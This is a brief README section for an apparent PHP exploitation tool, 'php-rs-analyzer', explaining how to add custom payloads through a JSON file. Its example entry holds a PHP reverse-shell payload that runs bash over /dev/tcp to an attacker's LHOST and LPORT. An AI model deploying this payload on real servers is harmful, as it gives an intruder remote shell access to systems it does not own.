## 🧩 JSON Payload Engine

You can extend payloads without editing Python code.

Example:

```json
[
  {
    "id": "custom_system_shell",
    "name": "Custom system() shell",
    "requires": ["system"],
    "weight": 95,
    "payload": "<?php system('bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'); ?>"
  }
]
```

Use it:

```
php-rs-analyzer --payloads payloads.json
```

